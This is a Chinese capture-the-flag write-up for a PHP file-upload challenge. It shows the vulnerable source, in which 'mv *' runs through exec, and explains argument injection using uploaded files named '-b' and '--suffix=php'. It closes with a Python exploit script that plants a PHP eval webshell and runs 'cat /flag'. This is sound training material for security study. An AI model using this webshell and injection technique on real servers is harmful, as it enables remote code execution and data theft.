​	文件上传类题目，dirsearch扫到备份文件index.php~获取源码：

![image-20250910195029262](img/image-20250910195029262.png)

```php
<?php
$uploadDir = '/tmp/upload/'; // 临时目录
$targetDir = '/var/www/html/upload/'; // 存储目录

$blacklist = [
    'php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phps', 'pht','jsp', 'jspa', 'jspx', 'jsw', 'jsv', 'jspf', 'jtml','asp', 'aspx', 'ascx', 'ashx', 'asmx', 'cer', 'aSp', 'aSpx', 'cEr', 'pHp','shtml', 'shtm', 'stm','pl', 'cgi', 'exe', 'bat', 'sh', 'py', 'rb', 'scgi','htaccess', 'htpasswd', "php2", "html", "htm", "asa", "asax",  "swf","ini"
];

$message = '';
$filesInTmp = [];

// 创建目标目录
if (!is_dir($targetDir)) {
    mkdir($targetDir, 0755, true);
}

if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// 上传临时目录
if (isset($_POST['upload']) && !empty($_FILES['files']['name'][0])) {
    $uploadedFiles = $_FILES['files'];
    foreach ($uploadedFiles['name'] as $index => $filename) {
        if ($uploadedFiles['error'][$index] !== UPLOAD_ERR_OK) {
            $message .= "文件 {$filename} 上传失败。<br>";
            continue;
        }

        $tmpName = $uploadedFiles['tmp_name'][$index];

        $filename = trim(basename($filename));
        if ($filename === '') {
            $message .= "文件名无效，跳过。<br>";
            continue;
        }

        $fileParts = pathinfo($filename);
        $extension = isset($fileParts['extension']) ? strtolower($fileParts['extension']) : '';

        $extension = trim($extension, '.');

        if (in_array($extension, $blacklist)) {
            $message .= "文件 {$filename} 因类型不安全（.{$extension}）被拒绝。<br>";
            continue;
        }

        $destination = $uploadDir . $filename;

        if (move_uploaded_file($tmpName, $destination)) {
            $message .= "文件 {$filename} 已上传至 $uploadDir$filename 。<br>";
        } else {
            $message .= "文件 {$filename} 移动失败。<br>";
        }
    }
}

// 获取临时目录中的所有文件
if (is_dir($uploadDir)) {
    $handle = opendir($uploadDir);
    if ($handle) {
        while (($file = readdir($handle)) !== false) {
            if (is_file($uploadDir . $file)) {
                $filesInTmp[] = $file;
            }
        }
        closedir($handle);
    }
}

// 处理确认上传完毕（移动文件）
if (isset($_POST['confirm_move'])) {
    if (empty($filesInTmp)) {
        $message .= "没有可移动的文件。<br>";
    } else {
        $output = [];
        $returnCode = 0;
        exec("cd $uploadDir ; mv * $targetDir 2>&1", $output, $returnCode);
        if ($returnCode === 0) {
            foreach ($filesInTmp as $file) {
                $message .= "已移动文件: {$file} 至$targetDir$file<br>";
            }
        } else {
            $message .= "移动文件失败: " .implode(', ', $output)."<br>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>多文件上传服务</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 800px; margin: auto; }
        .alert { padding: 10px; margin: 10px 0; background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .success { background: #d4edda; color: #155724; border-color: #c3e6cb; }
        ul { list-style-type: none; padding: 0; }
        li { margin: 5px 0; padding: 5px; background: #f0f0f0; }
    </style>
</head>
<body>
<div class="container">
    <h2>多文件上传服务</h2>

    <?php if ($message): ?>
        <div class="alert <?= strpos($message, '失败') ? '' : 'success' ?>">
            <?= $message ?>
        </div>
    <?php endif; ?>

    <form method="POST" enctype="multipart/form-data">
        <label for="files">选择文件：</label><br>
        <input type="file" name="files[]" id="files" multiple required>
        <button type="submit" name="upload">上传到临时目录</button>
    </form>

    <hr>

    <h3>待确认上传文件</h3>
    <?php if (empty($filesInTmp)): ?>
        <p>暂无待确认上传文件</p>
    <?php else: ?>
        <ul>
            <?php foreach ($filesInTmp as $file): ?>
                <li><?= htmlspecialchars($file) ?></li>
            <?php endforeach; ?>
        </ul>
        <form method="POST">
            <button type="submit" name="confirm_move">确认上传完毕，移动到存储目录</button>
        </form>
    <?php endif; ?>
</div>
</body>
</html>
```

​	可以看到对文件名存在过滤，直接上传木马不可行。

​	但是可以注意到代码是从临时目录使用`mv *`移动到储存目录，而`mv *`这种用法会造成参数注入问题，即`-`开头的文件名会被当作参数进行解析，查看mv的参数：

```
$ mv --help
用法：mv [选项]... [-T] 源文件 目标文件
　或：mv [选项]... 源文件... 目录
　或：mv [选项]... -t 目录 源文件...
将<源文件>重命名为<目标文件>，或将<源文件>移动至指定<目录>。

必选参数对长短选项同时适用。
      --backup[=CONTROL]       为每个已存在的目标文件创建备份
  -b                           类似--backup 但不接受参数
  -f, --force                  覆盖前不询问
  -i, --interactive            覆盖前询问
  -n, --no-clobber             不覆盖已存在文件
如果您指定了-i、-f、-n 中的多个，仅最后一个生效。
      --strip-trailing-slashes	去掉每个源文件参数尾部的斜线
  -S, --suffix=SUFFIX		替换常用的备份文件后缀
  -t, --target-directory=目录  将所有<源文件>移动至指定的<目录>中
  -T, --no-target-directory    将参数中所有<目标文件>部分视为普通文件
  -u, --update                 仅在<源文件>比目标文件更新，或者目标文件
                               不存在时进行移动操作
  -v, --verbose                对正在发生的操作给出解释
  -Z, --context                将目标文件的 SELinux 安全上下文设置为
                                 默认类型
      --help		显示此帮助信息并退出
      --version		显示版本信息并退出

备份文件的后缀为"~"，除非以--suffix 选项或是 SIMPLE_BACKUP_SUFFIX
环境变量指定。版本控制的方式可通过--backup 选项或 VERSION_CONTROL 环境
变量来选择。以下是可用的变量值：

  none, off       不进行备份(即使使用了--backup 选项)
  numbered, t     备份文件加上数字进行排序
  existing, nil   若有数字的备份文件已经存在则使用数字，否则使用普通方式备份
  simple, never   永远使用普通方式备份

GNU coreutils 在线帮助：<https://www.gnu.org/software/coreutils/>
请向 <http://translationproject.org/team/zh_CN.html> 报告 mv 的翻译错误
完整文档请见：<https://www.gnu.org/software/coreutils/mv>
或者在本地使用：info '(coreutils) mv invocation'
```

​	使用`-b`参数，会使得在移动操作前，生成一个带有`~`的备份文件，例如原本当前目录下有个`index.php`文件，那么如果再从其他地方也`mv`过来一个叫`index.php`的文件，那么原来的`index.php`就会变为`index.php~`

​	通过结合`--suffix`参数，便可以任意设置后缀。

​	即：

1. 先上传木马文件`shell.`到临时目录，同时将其移动到储存目录
2. 上传`shell.`，`-b`，`--suffix=php`至临时目录，同时再将这三个文件移动至储存目录，触发参数注入生成`shell.php`
3. rce读取flag



​	EXP:

```python
import requests

url = "http://127.0.0.1:8080"

def upload_file(filename, content):
    post_file = {
        "files[]": (filename, content, "application/octet-stream")
    }

    post_data = {
        "upload": "1"
    }

    res = requests.post(url, files=post_file,data=post_data)
    return res.text

def move_file():
    post_data = {
        "confirm_move": "1"
    }
    res = requests.post(url, data=post_data)
    return res.text

def rce(cmd):
    res = requests.post(url+"/upload/shell.php", data={"cmd": cmd})
    return res.text

if __name__ == "__main__":
    upload_file("shell.", b"<?php eval($_POST['cmd']); ?>")
    move_file()

    upload_file("shell.", b"")
    upload_file("-b", b"")
    upload_file("--suffix=php", b"")
    move_file()

    flag = rce("system('cat /flag');")
    print(flag)
```

